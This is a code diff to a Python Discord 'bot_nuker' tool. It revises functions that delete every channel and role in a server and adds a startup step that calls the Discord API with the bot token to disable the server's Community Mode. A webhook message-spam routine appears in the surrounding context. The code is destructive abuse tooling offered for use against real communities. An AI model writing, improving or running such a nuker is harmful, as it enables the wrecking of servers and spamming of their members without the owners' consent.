@@ -48,19 +48,18 @@ def bot_nuker():
             try:
                 await channel.delete()
                 await asynccprint(f"Deleted Channel {channel}", 0)
-            except:
-                await asyncio.sleep(0.3)
-                await delete_channel(channel)
+            except Exception as e:
+                await asynccprint (e, 1)
         
         async def delete_role(role):
             try:
                 if not role.managed:
                     await role.delete()
                     await asynccprint(f"Deleted Role {role}", 0)
+                else:
+                    return
             except Exception as e:
-                await asyncio.sleep(0.3)
-                print (e)
-                await delete_role(role)
+                await asynccprint (e, 1)
 
         async def spam_webhook(webhook, channel):
                 for _ in range(message_spam_times):
@@ -153,6 +152,28 @@ def bot_nuker():
 
         @bot.event
         async def on_ready():
+
+            headers = {
+                'Authorization': f'Bot {token}',
+                'Content-Type': 'application/json',
+            }
+
+            data = {
+                "description": None,
+                "features": ["NEWS"],
+                "preferred_locale": "en-US",
+                "rules_channel_id": None,
+                "public_updates_channel_id": None,
+                "safety_alerts_channel_id": None,
+            }
+
+            async with aiohttp.ClientSession() as session:
+                async with session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", json=data, headers=headers) as response:
+                    if response.status == 200:
+                        await asynccprint("Disabled Community Mode", 0)
+                    else:
+                        response_text = await response.text()
+                        await asynccprint(f"Failed to update guild settings. Status code: {response.status}, Response: {response_text}", 1)
 
             guild = bot.get_guild(guild_id)
 
